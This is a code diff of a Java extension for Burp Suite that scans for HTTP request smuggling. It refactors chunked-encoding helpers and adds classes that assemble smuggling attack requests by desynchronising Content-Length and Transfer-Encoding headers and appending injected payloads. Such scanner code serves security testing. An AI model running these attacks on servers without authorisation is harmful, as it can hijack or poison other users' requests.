@@ -2,98 +2,16 @@ package burp;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
-import java.nio.charset.StandardCharsets;
-import java.util.LinkedList;
 import java.util.List;
 import java.util.zip.GZIPOutputStream;
 
-
-class SmuggleHelper {
-
-    private RequestEngine engine;
-    private List<Resp> reqs = new LinkedList<>();
-    private IHttpService service;
-    private int id = 0;
-
-    SmuggleHelper(IHttpService service) {
-        this.service = service;
-        String url = service.getProtocol()+"://"+service.getHost()+":"+service.getPort();
-        this.engine = new ThreadedRequestEngine(url, 1, 10, 1, 10, 1, this::callback, 10);
-    }
-
-    void queue(String req) {
-        engine.queue(req); // , Integer.toString(id++)
-    }
-
-    private boolean callback(Request req, boolean interesting) {
-        reqs.add(new Resp(new Req(req.getRequestAsBytes(), req.getResponseAsBytes(), service)));
-        return false;
-    }
-
-    List<Resp> waitFor() {
-        engine.start(10);
-        engine.showStats(60);
-        return reqs;
-    }
-
-    // todo move into turbo intruder?
-}
-
 public class SmuggleScan extends Scan implements IScannerCheck  {
 
-    static private Resp buildPoc(byte[] req, IHttpService service) {
-        try {
-            byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
-            badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0);
-
-            ByteArrayOutputStream buf = new ByteArrayOutputStream();
-            buf.write(badMethodIfChunked);
-            buf.write("G".getBytes());
-
-            // first request ends here
-            buf.write(makeChunked(req, 0, 0));
-            return new Resp(new Req(buf.toByteArray(), null, service));
-        }
-        catch (IOException e) {
-            throw new RuntimeException();
-        }
+    SmuggleScan(String name) {
+        super(name);
     }
 
-    static byte[] gzipBody(byte[] baseReq) {
-        try {
-            byte[] req = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "gzip");
-            String body = Utilities.getBody(req);
-            ByteArrayOutputStream out = new ByteArrayOutputStream();
-            GZIPOutputStream gzip = new GZIPOutputStream(out);
-            gzip.write(Utilities.helpers.stringToBytes(body));
-            gzip.close();
-            return Utilities.setBody(req, Utilities.helpers.bytesToString(out.toByteArray()));
-        } catch (Exception e) {
-            Utilities.err(e.getMessage());
-            return baseReq;
-        }
-    }
 
-    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
-        if (!Utilities.containsBytes("Transfer-Encoding".getBytes(), baseReq)) {
-            baseReq = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "foo");
-        }
-
-        byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");
-        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
-        String body = Utilities.getBody(baseReq);
-        int chunkSize = bodySize+chunkOffset;
-        if (chunkSize > 0) {
-            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n0\r\n\r\n");
-        }
-        else {
-            chunkedReq = Utilities.setBody(chunkedReq, "0\r\n\r\n");
-        }
-        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
-        String newContentLength = Integer.toString(bodySize+contentLengthOffset);
-        chunkedReq = Utilities.setHeader(chunkedReq, "Content-Length", newContentLength);
-        return chunkedReq;
-    }
 
     boolean sendPoc(byte[] base, IHttpService service) {
         boolean gpoc = false;
@@ -121,10 +39,41 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
         return gpoc || cpoc2 || cpoc3;
     }
 
+    class DualChunkCL {
+        String getAttack(byte[] base, String inject) {
+            byte[] prep = Utilities.setHeader(base, "Connection", "keep-alive");
+            prep = bypassContentLengthFix(Utilities.makeChunked(prep, inject.length(), 0));
+            return Utilities.helpers.bytesToString(prep)+inject;
+        }
+    }
+
+    class DualChunkTE {
+        String getAttack(byte[] base, String inject) {
+            try {
+                byte[] initial = Utilities.setHeader(base, "Connection", "keep-alive");
+                ByteArrayOutputStream attackStream = new ByteArrayOutputStream();
+                attackStream.write(initial);
+                attackStream.write(inject.getBytes());
+
+                byte[] attack = Utilities.makeChunked(attackStream.toByteArray(), 0, 0);
+                String attackString = Utilities.helpers.bytesToString(attack);
+                int CL = attackString.lastIndexOf(inject) - Utilities.getBodyStart(attack);
+                attack = Utilities.setHeader(attack, "Content-Length", String.valueOf(CL));
+
+                attack = bypassContentLengthFix(attack);
+                Utils.out(Utilities.helpers.bytesToString(attack));
+                return Utilities.helpers.bytesToString(attack);
+            } catch (IOException e) {
+                return null;
+            }
+        }
+    }
+
     boolean sendPoc(byte[] base, IHttpService service, String name, String inject) {
         try {
-            String setupAttack = Utilities.helpers.bytesToString(bypassContentLengthFix(makeChunked(Utilities.setHeader(base, "Connection", "keep-alive"), inject.length(), 0)))+inject;
-            byte[] victim = makeChunked(base, 0, 0);
+            String setupAttack = new DualChunkCL().getAttack(base, inject);
+            //setupAttack = new DualChunkTE().getAttack(base, inject);
+            byte[] victim = Utilities.makeChunked(base, 0, 0);
 
             Resp baseline = request(service, victim);
             SmuggleHelper helper = new SmuggleHelper(service);
@@ -188,17 +137,17 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
         original = Utilities.addOrReplaceHeader(original, "Transfer-Encoding", "foo");
         original = Utilities.setHeader(original, "Connection", "close");
 
-        byte[] baseReq = makeChunked(original, 0, 0);
+        byte[] baseReq = Utilities.makeChunked(original, 0, 0);
         Resp syncedResp = request(service, baseReq);
         if (syncedResp.timedOut()) {
             Utilities.log("Timeout on first request. Aborting.");
             return null;
         }
 
-        Resp suggestedProbe = buildPoc(original, service);
+        Resp suggestedProbe = Utilities.buildPoc(original, service);
 
         if (Utilities.globalSettings.getBoolean("try chunk-truncate")) {
-            byte[] reverseLength = makeChunked(original, -1, 0); //Utilities.setHeader(baseReq, "Content-Length", "4");
+            byte[] reverseLength = Utilities.makeChunked(original, -1, 0); //Utilities.setHeader(baseReq, "Content-Length", "4");
             Resp truncatedChunk = request(service, reverseLength);
             if (truncatedChunk.timedOut()) {
 
@@ -236,7 +185,7 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
         if (Utilities.globalSettings.getBoolean("try timeout-diff")) {
 
             // if we get to here, either they're secure or the frontend uses chunked
-            byte[] overlongLength = makeChunked(original, 1, 0); //Utilities.setHeader(baseReq, "Content-Length", "6");
+            byte[] overlongLength = Utilities.makeChunked(original, 1, 0); //Utilities.setHeader(baseReq, "Content-Length", "6");
             Resp overlongLengthResp = request(service, overlongLength);
             short overlongLengthCode = 0;
             if (!overlongLengthResp.timedOut()) {
@@ -258,7 +207,7 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
             if (badChunkResp.getStatus() == syncedResp.getStatus()) {
                 Utilities.log("Invalid chunk probe didn't do anything. Attempting overlong chunk timeout instead.");
 
-                byte[] overlongChunk = makeChunked(original, 0, 1); //Utilities.setBody(baseReq, "1\r\n\r\n");
+                byte[] overlongChunk = Utilities.makeChunked(original, 0, 1); //Utilities.setBody(baseReq, "1\r\n\r\n");
                 Resp overlongChunkResp = request(service, overlongChunk);
 
                 short overlongChunkCode = overlongChunkResp.getStatus();
